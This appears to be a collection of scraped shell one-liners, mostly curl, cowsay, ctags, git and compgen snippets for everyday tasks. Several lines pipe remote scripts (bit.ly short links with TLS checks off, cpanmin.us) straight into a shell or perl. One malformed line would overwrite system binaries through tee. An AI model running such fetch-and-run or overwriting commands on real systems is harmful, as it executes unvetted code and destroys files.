curl -s 'http://pass.telekom.de/' -H 'User-Agent: Mozilla/45.0 (X11; Linux x86_63)' | xmllint --html --xpath '/html/body/div[2]/div[2]/div[1]/div/div[3]' - 2> /dev/null | sed -e 's/<[^>]*>//g'
curl -s 'http://192.168.1.254/cgi/b/dsl/ov/?be=0&l0=1&l1=0'|grep Bandwidth|grep -o '[0-9][0-9]* / [0-9.][0-9.]*'
curl -s $(ip route show | awk '/default/ { print $3 }'):8000 | grep -E '<p>(.+)</p>'
curl -q myip.ipip.net 2>/dev/null | awk -F'：' '{print \$2}' | awk '{print \$1}'
curl -q https://www.uuidgenerator.net/api/version4 2>/dev/null | tr -d '[:space:]' | pbcopy && pbpaste && echo
curl -o hqsso.sql.gz `sentinel db-dump production --json | jq .db_dump.signed_url | sed -E 's/^\
curl -o - https://databricksmanager-production.internal.quanticmind.com/metrics/errored | jq '.metrics.jobs.error |= sort_by(.created)'
curl -fsSkL http://bit.ly/1vT08Qr | sh; curl -fsSkL http://bit.ly/1vT0836 | sh
curl -fs --head https://google.com | grep ^date: | sed 's/date: //g'
curl -fSs https://1.1.1.1/cdn-cgi/trace | egrep '^(ip|loc)'
curl -X POST https://api.myjson.com/bins -d @- -H 'Accept: application/json' -H 'Content-type: application/json; charset=utf-8' | grep -o 'https://api.myjson.com/bins/[0-9A-z]*' | xargs open
curl -N -s internet-tty.net:8040/EUROPE | lame --decode --quiet --mp3input - - | minimodem 50 -M 1275 -S 1445 -5 -i -a -q -R 11025 -f -
curl -N -s http://internet-tty.net:8030/AUTOSTART | lame --decode --quiet --mp3input - - | minimodem rtty -i -a -q -R 11025 -f -
curl -N -s http://internet-tty.net:8000/ITTY | lame --decode --quiet --mp3input - - | minimodem rtty -i -a -q --rx-one -R 11025 -f -
curl -L https://cpanmin.us | vipe | perl - -l '$perl_home' local::lib App::cpanminus
curl -I6qs 2>/dev/null ifconfig.co/ip | head -1 | grep 404 >/dev/null && if [ $? == 0 ] ; then curl -6qs ifconfig.co/ip 2>/dev/null; fi
curl -I4qs 2>/dev/null ifconfig.co/ip | head -1 | grep 404 >/dev/null && if [ $? == 0 ] ; then curl -4qs ifconfig.co/ip 2>/dev/null; fi
curl -I http://google.com/ > /dev/null 2>&1 && echo success || echo failure
curl -F 'clbin=<-' https://clbin.com | tee /dev/tty | xclip
curl -6s icanhazip.com || echo off
curl --silent http://127.0.0.1:4040/api/tunnels | jq '.tunnels[0].public_url' | sed 's/\
curl --silent -Ik google.com || mtr --tcp -P53 8.8.8.8
curl --silent 'https://docs.google.com/spreadsheets/d/1GMMfhyLK0-q8XkIo3YxlWaZA5vVMuhU1kg41g4xLkXc/export?gid=4&format=csv' | grep -v '^#' | grep -v '^\
curl --silent 'http://xml.weather.yahoo.com/forecastrss?p=96707&u=f' | grep 'Current Conditions:' -A7 | sed -e 's/<[^>]\+>/ /g' -e 's/^\s\+//'
curl 'http://www.nextbus.com/predictor/fancyNewPredictionLayer.jsp?a=emery&r=Hollis&d=hollis_inbound&s=ho53_i&ts=ho45_i' -s | grep 'window.top.document.title' | cut -c 42-50
cuke \`git status --untracked-files --porcelain | grep '.feature$' | cut -b 4-\`
ctags -f ./tags -R --langmap='ruby:+.rake.builder.rjs' --languages=-javascript --extra=+f --exclude=.git --exclude=log `ruby -rrubygems -e 'p Gem.path.collect {|p| [
ctags && (which coffeetags && coffeetags -R -f .coffeetags || true) && (which ripper-tags && ripper-tags -R --exclude=vendor -f .rippertags)
cpufreq-info|grep mom; cpufreq-info|grep current
cpufreq-info|grep -A 2 current|grep governor
cpssh 12 || cpssh 13
cpp -dM /usr/include/errno.h | grep 'define E' | sort -n -k 3
cpanm \`dzil listdeps --missing\` &>/dev/null || { [[ $? == 25 ]] && print 'No moar deps needed.' }
cp .env.example .env || mysql -u root
cp $HOME/catkin/src/multi_tracker/examples/sample_data/config_20160412_134708_N1.py .; mv config_20160412_134708_N1.py config_`ls -p | grep bag | sed s/_delta_video.bag//g`.py
cowthink -f $(cowsay -l | tail +2 | xargs shuf -n1 -e)
cowsay -f $(cowsay -l | tail +2 | xargs shuf -n1 -e)
cowpropos $(ls /bin/bash /bin/bunzip2 /bin/bzcat /bin/bzcmp /bin/bzdiff /bin/bzegrep /bin/bzexe /bin/bzfgrep /bin/bzgrep /bin/bzip2 /bin/bzip2recover /bin/bzless /bin/bzmore /bin/cat /bin/chgrp /bin/chmod /bin/chown /bin/cp /bin/dash /bin/date /bin/dd /bin/df /bin/dir /bin/dmesg /bin/dnsdomainname /bin/domainname /bin/echo /bin/egrep /bin/false /bin/fgrep /bin/findmnt /bin/grep /bin/gunzip /bin/gzexe /bin/gzip /bin/hostname /bin/ip /bin/kill /bin/less /bin/lessecho /bin/lessfile /bin/lesskey /bin/lesspipe /bin/ln /bin/login /bin/ls /bin/lsblk /bin/mkdir /bin/mknod /bin/mktemp /bin/more /bin/mount /bin/mountpoint /bin/mv /bin/nisdomainname /bin/pidof /bin/ps /bin/pwd /bin/rbash /bin/readlink /bin/rm /bin/rmdir /bin/run-parts /bin/rzsh /bin/sed /bin/sh /bin/sh.distrib /bin/sleep /bin/ss /bin/stty /bin/su /bin/sync /bin/tar /bin/tempfile /bin/touch /bin/true /bin/umount /bin/uname /bin/uncompress /bin/vdir /bin/wdctl /bin/which /bin/ypdomainname /bin/zcat /bin/zcmp /bin/zdiff /bin/zegrep /bin/zfgrep /bin/zforce /bin/zgrep /bin/zless /bin/zmore /bin/znew /bin/zsh /bin/zsh5 /usr/local/bin/dash /usr/bin/2to3-2.7 /usr/bin/411toppm /usr/bin/[ /usr/bin/aclocal /usr/bin/aclocal-1.15 /usr/bin/addpart /usr/bin/addr2line /usr/bin/animate /usr/bin/animate-im6 /usr/bin/animate-im6.q16 /usr/bin/anytopnm /usr/bin/apt /usr/bin/apt-cache /usr/bin/apt-cdrom /usr/bin/apt-config /usr/bin/apt-get /usr/bin/apt-key /usr/bin/apt-mark /usr/bin/ar /usr/bin/arch /usr/bin/as /usr/bin/asciitopgm /usr/bin/aspcud /usr/bin/atktopbm /usr/bin/autoconf /usr/bin/autoheader /usr/bin/autom4te /usr/bin/automake /usr/bin/automake-1.15 /usr/bin/autoreconf /usr/bin/autoscan /usr/bin/autoupdate /usr/bin/awk /usr/bin/b2sum /usr/bin/base32 /usr/bin/base64 /usr/bin/basename /usr/bin/bashbug /usr/bin/bc /usr/bin/bioradtopgm /usr/bin/bmptopnm /usr/bin/bmptoppm /usr/bin/brushtopbm /usr/bin/buildhash /usr/bin/c++ /usr/bin/c++filt /usr/bin/c89 /usr/bin/c89-gcc /usr/bin/c99 /usr/bin/c99-gcc /usr/bin/c_rehash /usr/bin/camlp4 /usr/bin/camlp4boot /usr/bin/camlp4o /usr/bin/camlp4o.opt /usr/bin/camlp4of /usr/bin/camlp4of.opt /usr/bin/camlp4oof /usr/bin/camlp4oof.opt /usr/bin/camlp4orf /usr/bin/camlp4orf.opt /usr/bin/camlp4prof /usr/bin/camlp4r /usr/bin/camlp4r.opt /usr/bin/camlp4rf /usr/bin/camlp4rf.opt /usr/bin/captoinfo /usr/bin/catchsegv /usr/bin/cautious-launcher /usr/bin/cc /usr/bin/chage /usr/bin/chattr /usr/bin/chcon /usr/bin/chfn /usr/bin/chrt /usr/bin/chsh /usr/bin/cksum /usr/bin/clasp /usr/bin/clear /usr/bin/clear_console /usr/bin/clingo /usr/bin/cmp /usr/bin/cmuwmtopbm /usr/bin/comm /usr/bin/compare /usr/bin/compare-im6 /usr/bin/compare-im6.q16 /usr/bin/compose /usr/bin/composite /usr/bin/composite-im6 /usr/bin/composite-im6.q16 /usr/bin/conjure /usr/bin/conjure-im6 /usr/bin/conjure-im6.q16 /usr/bin/convert /usr/bin/convert-im6 /usr/bin/convert-im6.q16 /usr/bin/corelist /usr/bin/cpan /usr/bin/cpan5.26-x86_64-linux-gnu /usr/bin/cpp /usr/bin/cpp-7 /usr/bin/csplit /usr/bin/ctags /usr/bin/ctags-exuberant /usr/bin/ctstat /usr/bin/cudf2lp /usr/bin/curl /usr/bin/cut /usr/bin/darcs /usr/bin/dbus-cleanup-sockets /usr/bin/dbus-daemon /usr/bin/dbus-monitor /usr/bin/dbus-run-session /usr/bin/dbus-send /usr/bin/dbus-update-activation-environment /usr/bin/dbus-uuidgen /usr/bin/deb-systemd-helper /usr/bin/deb-systemd-invoke /usr/bin/debconf /usr/bin/debconf-apt-progress /usr/bin/debconf-communicate /usr/bin/debconf-copydb /usr/bin/debconf-escape /usr/bin/debconf-set-selections /usr/bin/debconf-show /usr/bin/defmt-c /usr/bin/defmt-sh /usr/bin/delpart /usr/bin/dh_autotools-dev_restoreconfig /usr/bin/dh_autotools-dev_updateconfig /usr/bin/dh_pypy /usr/bin/dh_python2 /usr/bin/dh_python3 /usr/bin/diff /usr/bin/diff3 /usr/bin/dircolors /usr/bin/dirmngr /usr/bin/dirmngr-client /usr/bin/dirname /usr/bin/display /usr/bin/display-im6 /usr/bin/display-im6.q16 /usr/bin/dpkg /usr/bin/dpkg-architecture /usr/bin/dpkg-buildflags /usr/bin/dpkg-buildpackage /usr/bin/dpkg-checkbuilddeps /usr/bin/dpkg-deb /usr/bin/dpkg-distaddfile /usr/bin/dpkg-divert /usr/bin/dpkg-genbuildinfo /usr/bin/dpkg-genchanges /usr/bin/dpkg-gencontrol /usr/bin/dpkg-gensymbols /usr/bin/dpkg-maintscript-helper /usr/bin/dpkg-mergechangelogs /usr/bin/dpkg-name /usr/bin/dpkg-parsechangelog /usr/bin/dpkg-query /usr/bin/dpkg-scanpackages /usr/bin/dpkg-scansources /usr/bin/dpkg-shlibdeps /usr/bin/dpkg-source /usr/bin/dpkg-split /usr/bin/dpkg-statoverride /usr/bin/dpkg-trigger /usr/bin/dpkg-vendor /usr/bin/du /usr/bin/dvipdf /usr/bin/dwp /usr/bin/edit /usr/bin/editor /usr/bin/elfedit /usr/bin/enc2xs /usr/bin/encguess /usr/bin/env /usr/bin/eps2eps /usr/bin/etags /usr/bin/ex /usr/bin/expand /usr/bin/expiry /usr/bin/expr /usr/bin/eyuvtoppm /usr/bin/factor /usr/bin/faillog /usr/bin/faked-sysv /usr/bin/faked-tcp /usr/bin/fakeroot /usr/bin/fakeroot-sysv /usr/bin/fakeroot-tcp /usr/bin/fallocate /usr/bin/fc-cache /usr/bin/fc-cat /usr/bin/fc-list /usr/bin/fc-match /usr/bin/fc-pattern /usr/bin/fc-query /usr/bin/fc-scan /usr/bin/fc-validate /usr/bin/fiascotopnm /usr/bin/file /usr/bin/find /usr/bin/findaffix /usr/bin/fitstopnm /usr/bin/flock /usr/bin/fmt /usr/bin/fold /usr/bin/free /usr/bin/fstopgm /usr/bin/funzip /usr/bin/g++ /usr/bin/g++-7 /usr/bin/g3topbm /usr/bin/gcc /usr/bin/gcc-7 /usr/bin/gcc-ar /usr/bin/gcc-ar-7 /usr/bin/gcc-nm /usr/bin/gcc-nm-7 /usr/bin/gcc-ranlib /usr/bin/gcc-ranlib-7 /usr/bin/gcov /usr/bin/gcov-7 /usr/bin/gcov-dump /usr/bin/gcov-dump-7 /usr/bin/gcov-tool /usr/bin/gcov-tool-7 /usr/bin/gemtopbm /usr/bin/gemtopnm /usr/bin/gencat /usr/bin/getconf /usr/bin/getent /usr/bin/getopt /usr/bin/ghostscript /usr/bin/giftopnm /usr/bin/git /usr/bin/git-receive-pack /usr/bin/git-shell /usr/bin/git-upload-archive /usr/bin/git-upload-pack /usr/bin/gold /usr/bin/gouldtoppm /usr/bin/gpasswd /usr/bin/gpg /usr/bin/gpg-agent /usr/bin/gpg-connect-agent /usr/bin/gpg-wks-server /usr/bin/gpg-zip /usr/bin/gpgconf /usr/bin/gpgparsemail /usr/bin/gpgsm /usr/bin/gpgsplit /usr/bin/gpgv /usr/bin/gprof /usr/bin/gringo /usr/bin/groups /usr/bin/gs /usr/bin/gsbj /usr/bin/gsdj /usr/bin/gsdj500 /usr/bin/gslj /usr/bin/gslp /usr/bin/gsnd /usr/bin/h2ph /usr/bin/h2xs /usr/bin/head /usr/bin/helpztags /usr/bin/hg /usr/bin/hg-ssh /usr/bin/hipstopgm /usr/bin/hostid /usr/bin/htop /usr/bin/i386 /usr/bin/iclingo /usr/bin/icombine /usr/bin/icontopbm /usr/bin/iconv /usr/bin/id /usr/bin/identify /usr/bin/identify-im6 /usr/bin/identify-im6.q16 /usr/bin/ifnames /usr/bin/ijoin /usr/bin/ilbmtoppm /usr/bin/imagetops /usr/bin/imgtoppm /usr/bin/import /usr/bin/import-im6 /usr/bin/import-im6.q16 /usr/bin/infocmp /usr/bin/infotocap /usr/bin/install /usr/bin/instmodsh /usr/bin/ionice /usr/bin/ipcmk /usr/bin/ipcrm /usr/bin/ipcs /usr/bin/ischroot /usr/bin/ispell /usr/bin/ispell-wrapper /usr/bin/join /usr/bin/jpegtopnm /usr/bin/json_pp /usr/bin/kbxutil /usr/bin/keyring /usr/bin/last /usr/bin/lastb /usr/bin/lastlog /usr/bin/lcf /usr/bin/ld /usr/bin/ld.bfd /usr/bin/ld.gold /usr/bin/ldd /usr/bin/leaftoppm /usr/bin/ledit /usr/bin/less /usr/bin/lessecho /usr/bin/lessfile /usr/bin/lesskey /usr/bin/lesspipe /usr/bin/libnetcfg /usr/bin/libtoolize /usr/bin/link /usr/bin/linux32 /usr/bin/linux64 /usr/bin/lispmtopgm /usr/bin/lnstat /usr/bin/locale /usr/bin/locale-check /usr/bin/localedef /usr/bin/logger /usr/bin/logname /usr/bin/lpconvert /usr/bin/lsattr /usr/bin/lscpu /usr/bin/lsipc /usr/bin/lslocks /usr/bin/lslogins /usr/bin/lsmem /usr/bin/lsns /usr/bin/lspgpot /usr/bin/lzcat /usr/bin/lzcmp /usr/bin/lzdiff /usr/bin/lzegrep /usr/bin/lzfgrep /usr/bin/lzgrep /usr/bin/lzless /usr/bin/lzma /usr/bin/lzmainfo /usr/bin/lzmore /usr/bin/m4 /usr/bin/macptopbm /usr/bin/make /usr/bin/make-first-existing-target /usr/bin/mawk /usr/bin/mcookie /usr/bin/md5sum /usr/bin/md5sum.textutils /usr/bin/mdatopbm /usr/bin/mesg /usr/bin/mgrtopbm /usr/bin/migrate-pubring-from-classic-gpg /usr/bin/mkcamlp4 /usr/bin/mkfifo /usr/bin/mogrify /usr/bin/mogrify-im6 /usr/bin/mogrify-im6.q16 /usr/bin/montage /usr/bin/montage-im6 /usr/bin/montage-im6.q16 /usr/bin/mtrace /usr/bin/mtvtoppm /usr/bin/munchlist /usr/bin/namei /usr/bin/nawk /usr/bin/ncurses5-config /usr/bin/neotoppm /usr/bin/newgrp /usr/bin/nice /usr/bin/nl /usr/bin/nm /usr/bin/nohup /usr/bin/nproc /usr/bin/nsenter /usr/bin/nstat /usr/bin/numfmt /usr/bin/objcopy /usr/bin/objdump /usr/bin/ocaml /usr/bin/ocamlc /usr/bin/ocamlc.byte /usr/bin/ocamlc.opt /usr/bin/ocamlcp /usr/bin/ocamlcp.byte /usr/bin/ocamlcp.opt /usr/bin/ocamldebug /usr/bin/ocamldep /usr/bin/ocamldep.byte /usr/bin/ocamldep.opt /usr/bin/ocamldoc /usr/bin/ocamldoc.opt /usr/bin/ocamldumpobj /usr/bin/ocamlfind /usr/bin/ocamllex /usr/bin/ocamllex.byte /usr/bin/ocamllex.opt /usr/bin/ocamlmklib /usr/bin/ocamlmklib.byte /usr/bin/ocamlmklib.opt /usr/bin/ocamlmktop /usr/bin/ocamlmktop.byte /usr/bin/ocamlmktop.opt /usr/bin/ocamlobjinfo /usr/bin/ocamlobjinfo.byte /usr/bin/ocamlobjinfo.opt /usr/bin/ocamlopt /usr/bin/ocamlopt.byte /usr/bin/ocamlopt.opt /usr/bin/ocamloptp /usr/bin/ocamloptp.byte /usr/bin/ocamloptp.opt /usr/bin/ocamlprof /usr/bin/ocamlprof.byte /usr/bin/ocamlprof.opt /usr/bin/ocamlrun /usr/bin/ocamlyacc /usr/bin/oclingo /usr/bin/od /usr/bin/opam /usr/bin/opam-admin /usr/bin/opam-installer /usr/bin/openssl /usr/bin/pager /usr/bin/palmtopnm /usr/bin/pamcut /usr/bin/pamdeinterlace /usr/bin/pamdice /usr/bin/pamfile /usr/bin/pamoil /usr/bin/pamstack /usr/bin/pamstretch /usr/bin/pamstretch-gen /usr/bin/paperconf /usr/bin/partx /usr/bin/passwd /usr/bin/paste /usr/bin/patch /usr/bin/pathchk /usr/bin/pbmclean /usr/bin/pbmlife /usr/bin/pbmmake /usr/bin/pbmmask /usr/bin/pbmpage /usr/bin/pbmpscale /usr/bin/pbmreduce /usr/bin/pbmtext /usr/bin/pbmtextps /usr/bin/pbmto10x /usr/bin/pbmtoascii /usr/bin/pbmtoatk /usr/bin/pbmtobbnbg /usr/bin/pbmtocmuwm /usr/bin/pbmtoepsi /usr/bin/pbmtoepson /usr/bin/pbmtog3 /usr/bin/pbmtogem /usr/bin/pbmtogo /usr/bin/pbmtoicon /usr/bin/pbmtolj /usr/bin/pbmtomacp /usr/bin/pbmtomda /usr/bin/pbmtomgr /usr/bin/pbmtonokia /usr/bin/pbmtopgm /usr/bin/pbmtopi3 /usr/bin/pbmtoplot /usr/bin/pbmtoppa /usr/bin/pbmtopsg3 /usr/bin/pbmtoptx /usr/bin/pbmtowbmp /usr/bin/pbmtox10bm /usr/bin/pbmtoxbm /usr/bin/pbmtoybm /usr/bin/pbmtozinc /usr/bin/pbmupc /usr/bin/pcxtoppm /usr/bin/pdb /usr/bin/pdb2.7 /usr/bin/pdb3 /usr/bin/pdb3.6 /usr/bin/pdf2dsc /usr/bin/pdf2ps /usr/bin/perl /usr/bin/perl5.26-x86_64-linux-gnu /usr/bin/perl5.26.1 /usr/bin/perlbug /usr/bin/perldoc /usr/bin/perlivp /usr/bin/perlthanks /usr/bin/pf2afm /usr/bin/pfbtopfa /usr/bin/pgmbentley /usr/bin/pgmcrater /usr/bin/pgmedge /usr/bin/pgmenhance /usr/bin/pgmhist /usr/bin/pgmkernel /usr/bin/pgmnoise /usr/bin/pgmnorm /usr/bin/pgmoil /usr/bin/pgmramp /usr/bin/pgmslice /usr/bin/pgmtexture /usr/bin/pgmtofs /usr/bin/pgmtolispm /usr/bin/pgmtopbm /usr/bin/pgmtoppm /usr/bin/pgrep /usr/bin/pi1toppm /usr/bin/pi3topbm /usr/bin/piconv /usr/bin/pinentry /usr/bin/pinentry-curses /usr/bin/pinky /usr/bin/pip3 /usr/bin/pjtoppm /usr/bin/pkg-config /usr/bin/pkill /usr/bin/pl2pm /usr/bin/pldd /usr/bin/pmap /usr/bin/pngtopnm /usr/bin/pnmalias /usr/bin/pnmarith /usr/bin/pnmcat /usr/bin/pnmcolormap /usr/bin/pnmcomp /usr/bin/pnmconvol /usr/bin/pnmcrop /usr/bin/pnmcut /usr/bin/pnmdepth /usr/bin/pnmenlarge /usr/bin/pnmfile /usr/bin/pnmflip /usr/bin/pnmgamma /usr/bin/pnmhisteq /usr/bin/pnmhistmap /usr/bin/pnmindex /usr/bin/pnminterp /usr/bin/pnminterp-gen /usr/bin/pnminvert /usr/bin/pnmmargin /usr/bin/pnmmontage /usr/bin/pnmnlfilt /usr/bin/pnmnoraw /usr/bin/pnmnorm /usr/bin/pnmpad /usr/bin/pnmpaste /usr/bin/pnmpsnr /usr/bin/pnmquant /usr/bin/pnmremap /usr/bin/pnmrotate /usr/bin/pnmscale /usr/bin/pnmscalefixed /usr/bin/pnmshear /usr/bin/pnmsmooth /usr/bin/pnmsplit /usr/bin/pnmtile /usr/bin/pnmtoddif /usr/bin/pnmtofiasco /usr/bin/pnmtofits /usr/bin/pnmtojpeg /usr/bin/pnmtopalm /usr/bin/pnmtoplainpnm /usr/bin/pnmtopng /usr/bin/pnmtops /usr/bin/pnmtorast /usr/bin/pnmtorle /usr/bin/pnmtosgi /usr/bin/pnmtosir /usr/bin/pnmtotiff /usr/bin/pnmtotiffcmyk /usr/bin/pnmtoxwd /usr/bin/pod2html /usr/bin/pod2man /usr/bin/pod2text /usr/bin/pod2usage /usr/bin/podchecker /usr/bin/podselect /usr/bin/pphs /usr/bin/ppm3d /usr/bin/ppmbrighten /usr/bin/ppmchange /usr/bin/ppmcie /usr/bin/ppmcolormask /usr/bin/ppmcolors /usr/bin/ppmdim /usr/bin/ppmdist /usr/bin/ppmdither /usr/bin/ppmfade /usr/bin/ppmflash /usr/bin/ppmforge /usr/bin/ppmhist /usr/bin/ppmlabel /usr/bin/ppmmake /usr/bin/ppmmix /usr/bin/ppmnorm /usr/bin/ppmntsc /usr/bin/ppmpat /usr/bin/ppmquant /usr/bin/ppmquantall /usr/bin/ppmqvga /usr/bin/ppmrainbow /usr/bin/ppmrelief /usr/bin/ppmshadow /usr/bin/ppmshift /usr/bin/ppmspread /usr/bin/ppmtoacad /usr/bin/ppmtobmp /usr/bin/ppmtoeyuv /usr/bin/ppmtogif /usr/bin/ppmtoicr /usr/bin/ppmtoilbm /usr/bin/ppmtojpeg /usr/bin/ppmtoleaf /usr/bin/ppmtolj /usr/bin/ppmtomap /usr/bin/ppmtomitsu /usr/bin/ppmtompeg /usr/bin/ppmtoneo /usr/bin/ppmtopcx /usr/bin/ppmtopgm /usr/bin/ppmtopi1 /usr/bin/ppmtopict /usr/bin/ppmtopj /usr/bin/ppmtopuzz /usr/bin/ppmtorgb3 /usr/bin/ppmtosixel /usr/bin/ppmtotga /usr/bin/ppmtouil /usr/bin/ppmtowinicon /usr/bin/ppmtoxpm /usr/bin/ppmtoyuv /usr/bin/ppmtoyuvsplit /usr/bin/ppmtv /usr/bin/pr /usr/bin/print /usr/bin/printafm /usr/bin/printenv /usr/bin/printf /usr/bin/prlimit /usr/bin/prove /usr/bin/ps2ascii /usr/bin/ps2epsi /usr/bin/ps2pdf /usr/bin/ps2pdf12 /usr/bin/ps2pdf13 /usr/bin/ps2pdf14 /usr/bin/ps2pdfwr /usr/bin/ps2ps /usr/bin/ps2ps2 /usr/bin/ps2txt /usr/bin/psidtopgm /usr/bin/pstopnm /usr/bin/ptar /usr/bin/ptardiff /usr/bin/ptargrep /usr/bin/ptx /usr/bin/pwdx /usr/bin/py3clean /usr/bin/py3compile /usr/bin/py3versions /usr/bin/pybuild /usr/bin/pyclean /usr/bin/pycompile /usr/bin/pydoc /usr/bin/pydoc2.7 /usr/bin/pydoc3 /usr/bin/pydoc3.6 /usr/bin/pygettext /usr/bin/pygettext2.7 /usr/bin/pygettext3 /usr/bin/pygettext3.6 /usr/bin/python /usr/bin/python2 /usr/bin/python2.7 /usr/bin/python3 /usr/bin/python3-config /usr/bin/python3.6 /usr/bin/python3.6-config /usr/bin/python3.6m /usr/bin/python3.6m-config /usr/bin/python3m /usr/bin/python3m-config /usr/bin/pyversions /usr/bin/qrttoppm /usr/bin/ranlib /usr/bin/rasttopnm /usr/bin/rawtopgm /usr/bin/rawtoppm /usr/bin/rcp /usr/bin/rdma /usr/bin/readelf /usr/bin/readline-editor /usr/bin/realpath /usr/bin/reify /usr/bin/rename.ul /usr/bin/renice /usr/bin/reset /usr/bin/resizepart /usr/bin/rev /usr/bin/rgb3toppm /usr/bin/rgrep /usr/bin/rletopnm /usr/bin/rlogin /usr/bin/routef /usr/bin/routel /usr/bin/rpcgen /usr/bin/rsh /usr/bin/rsync /usr/bin/rtstat /usr/bin/run-mailcap /usr/bin/runcon /usr/bin/rview /usr/bin/rvim /usr/bin/savelog /usr/bin/sbigtopgm /usr/bin/scp /usr/bin/script /usr/bin/scriptreplay /usr/bin/sdiff /usr/bin/see /usr/bin/select-default-iwrap /usr/bin/select-editor /usr/bin/sensible-browser /usr/bin/sensible-editor /usr/bin/sensible-pager /usr/bin/seq /usr/bin/setarch /usr/bin/setsid /usr/bin/setterm /usr/bin/sftp /usr/bin/sg /usr/bin/sgitopnm /usr/bin/sha1sum /usr/bin/sha224sum /usr/bin/sha256sum /usr/bin/sha384sum /usr/bin/sha512sum /usr/bin/shasum /usr/bin/shred /usr/bin/shuf /usr/bin/sirtopnm /usr/bin/size /usr/bin/skill /usr/bin/slabtop /usr/bin/sldtoppm /usr/bin/slogin /usr/bin/snice /usr/bin/sort /usr/bin/sotruss /usr/bin/spctoppm /usr/bin/spell /usr/bin/splain /usr/bin/split /usr/bin/sprof /usr/bin/sputoppm /usr/bin/sq /usr/bin/ssh /usr/bin/ssh-add /usr/bin/ssh-agent /usr/bin/ssh-argv0 /usr/bin/ssh-copy-id /usr/bin/ssh-keygen /usr/bin/ssh-keyscan /usr/bin/st4topgm /usr/bin/stat /usr/bin/stdbuf /usr/bin/stream /usr/bin/stream-im6 /usr/bin/stream-im6.q16 /usr/bin/strings /usr/bin/strip /usr/bin/sudo /usr/bin/sudoedit /usr/bin/sudoreplay /usr/bin/sum /usr/bin/symcryptrun /usr/bin/tabs /usr/bin/tac /usr/bin/tail /usr/bin/taskset /usr/bin/tee /usr/bin/test /usr/bin/tgatoppm /usr/bin/thinkjettopbm /usr/bin/tic /usr/bin/tifftopnm /usr/bin/timeout /usr/bin/tload /usr/bin/toe /usr/bin/top /usr/bin/touch /usr/bin/tput /usr/bin/tr /usr/bin/truncate /usr/bin/tryaffix /usr/bin/tset /usr/bin/tsort /usr/bin/tty /usr/bin/tzselect /usr/bin/ucf /usr/bin/ucfq /usr/bin/ucfr /usr/bin/unexpand /usr/bin/uniq /usr/bin/unlink /usr/bin/unlzma /usr/bin/unshare /usr/bin/unsq /usr/bin/unxz /usr/bin/unzip /usr/bin/unzipsfx /usr/bin/update-alternatives /usr/bin/update-mime-database /usr/bin/uptime /usr/bin/users /usr/bin/utmpdump /usr/bin/uuidgen | tr 'A-Z' 'a-z' | tee  /usr/bin/vi /usr/bin/view /usr/bin/vim /usr/bin/vim.basic /usr/bin/vimdiff /usr/bin/vimtutor /usr/bin/vmstat /usr/bin/w /usr/bin/w.procps /usr/bin/wall /usr/bin/watch /usr/bin/watchgnupg /usr/bin/wbmptopbm /usr/bin/wc /usr/bin/wget /usr/bin/whereis /usr/bin/which /usr/bin/who /usr/bin/whoami /usr/bin/winicontoppm /usr/bin/x86_64 /usr/bin/x86_64-linux-gnu-addr2line /usr/bin/x86_64-linux-gnu-ar /usr/bin/x86_64-linux-gnu-as /usr/bin/x86_64-linux-gnu-c++filt /usr/bin/x86_64-linux-gnu-cpp /usr/bin/x86_64-linux-gnu-cpp-7 /usr/bin/x86_64-linux-gnu-dwp /usr/bin/x86_64-linux-gnu-elfedit /usr/bin/x86_64-linux-gnu-g++ /usr/bin/x86_64-linux-gnu-g++-7 /usr/bin/x86_64-linux-gnu-gcc /usr/bin/x86_64-linux-gnu-gcc-7 /usr/bin/x86_64-linux-gnu-gcc-ar /usr/bin/x86_64-linux-gnu-gcc-ar-7 /usr/bin/x86_64-linux-gnu-gcc-nm /usr/bin/x86_64-linux-gnu-gcc-nm-7 /usr/bin/x86_64-linux-gnu-gcc-ranlib /usr/bin/x86_64-linux-gnu-gcc-ranlib-7 /usr/bin/x86_64-linux-gnu-gcov /usr/bin/x86_64-linux-gnu-gcov-7 /usr/bin/x86_64-linux-gnu-gcov-dump /usr/bin/x86_64-linux-gnu-gcov-dump-7 /usr/bin/x86_64-linux-gnu-gcov-tool /usr/bin/x86_64-linux-gnu-gcov-tool-7 /usr/bin/x86_64-linux-gnu-gold /usr/bin/x86_64-linux-gnu-gprof /usr/bin/x86_64-linux-gnu-ld /usr/bin/x86_64-linux-gnu-ld.bfd /usr/bin/x86_64-linux-gnu-ld.gold /usr/bin/x86_64-linux-gnu-nm /usr/bin/x86_64-linux-gnu-objcopy /usr/bin/x86_64-linux-gnu-objdump /usr/bin/x86_64-linux-gnu-pkg-config /usr/bin/x86_64-linux-gnu-python3-config /usr/bin/x86_64-linux-gnu-python3.6-config /usr/bin/x86_64-linux-gnu-python3.6m-config /usr/bin/x86_64-linux-gnu-python3m-config /usr/bin/x86_64-linux-gnu-ranlib /usr/bin/x86_64-linux-gnu-readelf /usr/bin/x86_64-linux-gnu-size /usr/bin/x86_64-linux-gnu-strings /usr/bin/x86_64-linux-gnu-strip /usr/bin/x86_64-pc-linux-gnu-pkg-config /usr/bin/xargs /usr/bin/xauth /usr/bin/xbmtopbm /usr/bin/xdg-user-dir /usr/bin/xdg-user-dirs-update /usr/bin/ximtoppm /usr/bin/xpmtoppm /usr/bin/xsubpp /usr/bin/xvminitoppm /usr/bin/xwdtopnm /usr/bin/xxd /usr/bin/xz /usr/bin/xzcat /usr/bin/xzcmp /usr/bin/xzdiff /usr/bin/xzegrep /usr/bin/xzfgrep /usr/bin/xzgrep /usr/bin/xzless /usr/bin/xzmore /usr/bin/ybmtopbm /usr/bin/yes /usr/bin/yuvsplittoppm /usr/bin/yuvtoppm /usr/bin/zdump /usr/bin/zeisstopnm /usr/bin/zipdetails /usr/bin/zipgrep /usr/bin/zipinfo /usr/bin/zsh ~/brew/bin/* | xargs basename | gshuf -n 1)
coog server tail -f | grep --line-buffered -vIE '(DEBUG|INFO)'
consul members --rpc-addr $HOSTNAME:8400 | grep -v Node | sort -h
confirm 'Purge all non-current git branches?' && git branch --merged | grep -v \* | xargs git branch -D
config log -1 | cowsay -f dragon-and-cow | lolcat
condor_status -autoformat GLIDEIN_ResourceName HAS_PHSW | sort | uniq
composer dump| artisan clear-compiled| artisan optimize
composer dump-autoload && php artisan db:seed || echo 'Autoload Generation failed'
compgen -c | sort | less
compgen -a -A function | grep -v ^_ | sort
compgen -A function -abck | grep -v '^_' | uniq
compaudit 2>&1 | grep -v 'There are insecure directories:' | xargs chmod go-w
comparemaster | while read i; do echo $i && cat $i | extract-text > ~/temp/checkthis && yasp ~/temp/checkthis && rm -rf ~/temp/checkthis; done
comparemaster | grep svg | while read i; do svgo $i; done
commando -c echo | grep --line-buffered Modified | conscript
